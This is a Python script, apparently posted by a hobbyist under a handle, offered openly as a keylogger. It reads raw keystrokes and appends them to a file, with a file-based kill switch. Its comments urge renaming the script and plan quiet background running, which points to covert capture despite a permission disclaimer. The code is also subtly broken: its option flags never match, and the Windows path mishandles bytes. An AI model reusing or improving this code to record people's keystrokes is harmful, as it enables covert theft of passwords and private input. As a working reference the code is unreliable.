#!/usr/bin/env python3
#
# Brought to you by ~ r3dg0bl1n <(¬‿¬)>
# v/ 0.1-alpha
#
# --------------------------- INSTRUCTIONS ----------------------------
# Usage: python3 r3_keylogger.py output.txt [-v] [-d]
# -v : Prints output on shell.
# -d : Allows to terminate process pressing "º" key
# (?) : To stop execution create the empty file /tmp/r3ctrl
# ------------------------------ NOTES --------------------------------
# For god's sake, change the script name.
# ---------------------------- DISCLAIMER -----------------------------
# Use only with explicit permission of the system owner.
# Breaking things or getting arrested is on you, I'm just a goblin.
# ----------------------------- LICENSE -------------------------------
# Licensed under the MIT License (see LICENSE file in repo)
#======================================================================

#============================ ALPHA TABLE =============================
#------------------------------- bugs ---------------------------------
# [X] Throws ugly error message on Thread exit.
#----------------------------- features -------------------------------
# [ ] Compatible on Windows.
# [X] Clean thread exit.
# [ ] Run on background quietly.
# [ ] Command help and usage output
#======================================================================

# PRE
import sys, os, time, threading as th;
_argv_len_min = 1;
_argv_len_max = 3;
_stp = th.Event();

# H - Core Functions
def stop(c):
    if c == 2: print("ERR[1]: Specify an output file");
    elif c == 3: print("ERR[2]: Could not open file");
    exit(c);

if os.name == "nt":
    import msvcrt
    def getch():
        return msvcrt.getch();
else:
    import tty, termios as tm;
    def getch():
        fd = sys.stdin.fileno();
        ost = tm.tcgetattr(fd);
        try:
            tty.setraw(fd);
            ch = sys.stdin.read(1);
        finally: tm.tcsetattr(fd, tm.TCSADRAIN, ost);
        return ch;

# SRC - Functions
def reg():
    try:
        while not _stp.is_set():
            k = getch();
            if k in ("\r", "\r\n"):
                of.write("\n");
                if a_v: print("");
            elif a_d and k == "\u00BA":
                _stp.set();
            else:
                of.write(k);
                if a_v: print(k, end="", flush=True);
            of.flush();
    finally:
        if os.path.exists("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");
        of.write("\n");
        of.close();
        stop(0);

def ctrl():
    while True:
        if os.path.exists("/tmp/r3ctrl"):
            _stp.set();
            break;
        time.sleep(1);

# SRC - Command breakdown
a_v = False;
a_d = False;
a_fn = "";

if len(sys.argv) <= _argv_len_min: stop(2);
for i, a in enumerate(sys.argv):
    if i > _argv_len_max: break;
    if a == "-v ": a_v = True;
    elif a == "-d ": a_d = True;
    else: a_fn = a;

# SRC - Body
if os.path.exists("/tmp/r3ctrl"): os.remove("/tmp/r3ctrl");

of = None;
try: of = open(a_fn, "a");
except IOError as e: stop(3);

t0 = th.Thread(target=ctrl, daemon=True);
t0.start();

of.write("=============== NEW SESSION ===============\n");
reg();     

# =====================================================================
# Soy español, ¿a qué quieres que te gane?
# ~ r3dg0bl1n <(¬‿¬)>
# =====================================================================